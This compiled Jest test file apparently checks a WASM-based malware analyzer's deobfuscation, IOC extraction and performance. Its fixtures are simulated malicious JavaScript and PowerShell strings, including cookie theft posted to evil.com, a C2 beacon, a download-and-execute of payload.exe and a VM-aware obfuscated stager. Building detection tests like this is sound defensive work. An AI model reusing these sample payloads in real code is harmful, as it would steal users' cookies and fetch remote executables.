"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const globals_1 = require("@jest/globals");
const analysisService_1 = require("../../../Athena/services/analysisService");
(0, globals_1.describe)('End-to-End WASM Analysis Workflow', () => {
    (0, globals_1.beforeAll)(() => __awaiter(void 0, void 0, void 0, function* () {
        // Ensure WASM modules are initialized
        yield (0, analysisService_1.getWASMStats)();
    }));
    (0, globals_1.describe)('Complete Malware Analysis Pipeline', () => {
        (0, globals_1.test)('should analyze a simple JavaScript file', () => __awaiter(void 0, void 0, void 0, function* () {
            const jsCode = `
        function maliciousFunction() {
          eval(atob('YWxlcnQoIllvdSBoYXZlIGJlZW4gaGFja2VkISIp'));
          document.cookie = "stolen=" + document.cookie;
          fetch('http://evil.com/steal', { method: 'POST', body: document.cookie });
        }
      `;
            const result = yield (0, analysisService_1.analyzeWithWASM)(jsCode, 'malicious.js');
            (0, globals_1.expect)(result).toBeDefined();
            (0, globals_1.expect)(result.analysisReport).toContain('WASM Analysis Report');
            (0, globals_1.expect)(result.analysisReport).toContain('File Processing');
            (0, globals_1.expect)(result.analysisReport).toContain('Pattern Matching');
            (0, globals_1.expect)(result.analysisReport).toContain('Deobfuscation Analysis');
            (0, globals_1.expect)(result.vulnerabilities.length).toBeGreaterThan(0);
        }), 30000);
        (0, globals_1.test)('should detect and deobfuscate Base64 encoded malware', () => __awaiter(void 0, void 0, void 0, function* () {
            // Base64 encoded PowerShell command
            const encodedMalware = 'UG93ZXJTaGVsbCAtRW5jb2RlZENvbW1hbmQgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggImNtZC5leGUiIC1Bcmd1bWVudExpc3QgIi9jIHBpbmcgZXZpbC5jb20i';
            const result = yield (0, analysisService_1.analyzeWithWASM)(encodedMalware, 'encoded.txt');
            (0, globals_1.expect)(result.analysisReport).toContain('Obfuscation Detected: Yes');
            (0, globals_1.expect)(result.analysisReport).toContain('Base64');
            (0, globals_1.expect)(result.deobfuscatedCode).not.toBe(encodedMalware);
            (0, globals_1.expect)(result.deobfuscatedCode).toContain('PowerShell');
        }), 30000);
        (0, globals_1.test)('should handle multi-layer obfuscation', () => __awaiter(void 0, void 0, void 0, function* () {
            // Triple Base64 encoded "malware"
            let encoded = 'malware';
            for (let i = 0; i < 3; i++) {
                encoded = Buffer.from(encoded).toString('base64');
            }
            const result = yield (0, analysisService_1.analyzeWithWASM)(encoded, 'multilayer.txt');
            (0, globals_1.expect)(result.analysisReport).toContain('Layers Processed');
            (0, globals_1.expect)(result.deobfuscatedCode).toBe('malware');
        }), 30000);
        (0, globals_1.test)('should extract IOCs from malicious content', () => __awaiter(void 0, void 0, void 0, function* () {
            const maliciousContent = `
        // Malicious script with various IOCs
        const c2Server = "http://192.168.1.100:8080/beacon";
        const backupC2 = "https://evil-domain.com/c2";
        const payload = "http://malware-host.net/payload.exe";
        
        function connect() {
          fetch(c2Server, {
            method: 'POST',
            body: JSON.stringify({
              hostname: window.location.hostname,
              userAgent: navigator.userAgent
            })
          });
        }
        
        // Download and execute payload
        downloadFile(payload, "C:\\\\Windows\\\\Temp\\\\update.exe");
      `;
            const result = yield (0, analysisService_1.analyzeWithWASM)(maliciousContent, 'ioc-sample.js');
            (0, globals_1.expect)(result.analysisReport).toContain('Indicators of Compromise (IOCs)');
            (0, globals_1.expect)(result.analysisReport).toContain('192.168.1.100');
            (0, globals_1.expect)(result.analysisReport).toContain('evil-domain.com');
            (0, globals_1.expect)(result.analysisReport).toContain('malware-host.net');
        }), 30000);
        (0, globals_1.test)('should detect packed/obfuscated JavaScript', () => __awaiter(void 0, void 0, void 0, function* () {
            // Simulated packed JavaScript
            const packedJs = `
        eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('0.1("2 3!");',4,4,'console|log|Hello|World'.split('|'),0,{}))
      `;
            const result = yield (0, analysisService_1.analyzeWithWASM)(packedJs, 'packed.js');
            (0, globals_1.expect)(result.analysisReport).toContain('JavaScript');
            (0, globals_1.expect)(result.vulnerabilities.length).toBeGreaterThan(0);
        }), 30000);
        (0, globals_1.test)('should analyze hex-encoded shellcode', () => __awaiter(void 0, void 0, void 0, function* () {
            // Simple hex-encoded content
            const hexShellcode = '\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x21\\x0a\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65';
            const result = yield (0, analysisService_1.analyzeWithWASM)(hexShellcode, 'shellcode.bin');
            (0, globals_1.expect)(result.analysisReport).toContain('Hex');
            (0, globals_1.expect)(result.deobfuscatedCode).toContain('Hello World');
        }), 30000);
        (0, globals_1.test)('should handle empty and invalid inputs gracefully', () => __awaiter(void 0, void 0, void 0, function* () {
            // Test empty input
            const emptyResult = yield (0, analysisService_1.analyzeWithWASM)('', 'empty.txt');
            (0, globals_1.expect)(emptyResult).toBeDefined();
            (0, globals_1.expect)(emptyResult.analysisReport).toContain('WASM Analysis Report');
            // Test invalid UTF-8
            const invalidResult = yield (0, analysisService_1.analyzeWithWASM)('\xFF\xFE\xFD', 'invalid.bin');
            (0, globals_1.expect)(invalidResult).toBeDefined();
            (0, globals_1.expect)(invalidResult.analysisReport).toContain('WASM Analysis Report');
        }), 30000);
    });
    (0, globals_1.describe)('Performance Characteristics', () => {
        (0, globals_1.test)('should handle large files efficiently', () => __awaiter(void 0, void 0, void 0, function* () {
            // Generate 5MB of test data
            const largeContent = 'A'.repeat(5 * 1024 * 1024);
            const startTime = Date.now();
            const result = yield (0, analysisService_1.analyzeWithWASM)(largeContent, 'large.txt');
            const analysisTime = Date.now() - startTime;
            (0, globals_1.expect)(result).toBeDefined();
            (0, globals_1.expect)(analysisTime).toBeLessThan(10000); // Should complete within 10 seconds
            console.log(`Large file (5MB) analysis completed in ${analysisTime}ms`);
        }), 30000);
    });
    (0, globals_1.describe)('Module Statistics', () => {
        (0, globals_1.test)('should retrieve module statistics', () => __awaiter(void 0, void 0, void 0, function* () {
            var _a, _b;
            const stats = yield (0, analysisService_1.getWASMStats)();
            (0, globals_1.expect)(stats.initialized).toBe(true);
            (0, globals_1.expect)(stats.patternMatcherStats).toBeDefined();
            (0, globals_1.expect)((_a = stats.patternMatcherStats) === null || _a === void 0 ? void 0 : _a.rulesLoaded).toBeGreaterThan(0);
            (0, globals_1.expect)(stats.deobfuscatorConfig).toBeDefined();
            (0, globals_1.expect)((_b = stats.deobfuscatorConfig) === null || _b === void 0 ? void 0 : _b.maxLayers).toBe(10);
        }));
    });
    (0, globals_1.describe)('Real-World Malware Samples', () => {
        (0, globals_1.test)('should analyze a complex malware sample', () => __awaiter(void 0, void 0, void 0, function* () {
            // Simulated complex malware with multiple techniques
            const complexMalware = `
        // Stage 1: Environment detection
        var _0x5a1b=['location','hostname','userAgent','platform'];
        var isVM = navigator[_0x5a1b[2]].includes('VMware') || navigator[_0x5a1b[3]].includes('Virtual');
        
        // Stage 2: Obfuscated payload
        var payload = atob('ZnVuY3Rpb24gZXhlY3V0ZSgpIHsgZXZhbChhdG9iKCdZV3hsY25Rb0lsaGFja1ZFSWlrPScpKTsgfQ==');
        
        // Stage 3: C2 communication
        var c2 = String.fromCharCode(104,116,116,112,58,47,47) + atob('MTkyLjE2OC4xLjEwMA==') + ':' + (8080).toString();
        
        // Stage 4: Persistence mechanism
        if (!isVM) {
          eval(payload);
          fetch(c2 + '/beacon', {
            method: 'POST',
            body: JSON.stringify({
              h: window[_0x5a1b[0]][_0x5a1b[1]],
              u: navigator[_0x5a1b[2]],
              t: new Date().getTime()
            })
          });
        }
        
        // Stage 5: Additional obfuscation
        eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('1 0(){2.3("4 5!")}0();',6,6,'downloadPayload|function|console|log|Downloading|malware'.split('|')));
      `;
            const result = yield (0, analysisService_1.analyzeWithWASM)(complexMalware, 'complex-malware.js');
            (0, globals_1.expect)(result.analysisReport).toContain('Obfuscation Detected: Yes');
            (0, globals_1.expect)(result.analysisReport).toContain('JavaScript');
            (0, globals_1.expect)(result.vulnerabilities.length).toBeGreaterThan(2); // Should detect multiple issues
            (0, globals_1.expect)(result.analysisReport).toContain('192.168.1.100'); // Should extract C2 IP
        }), 30000);
    });
});
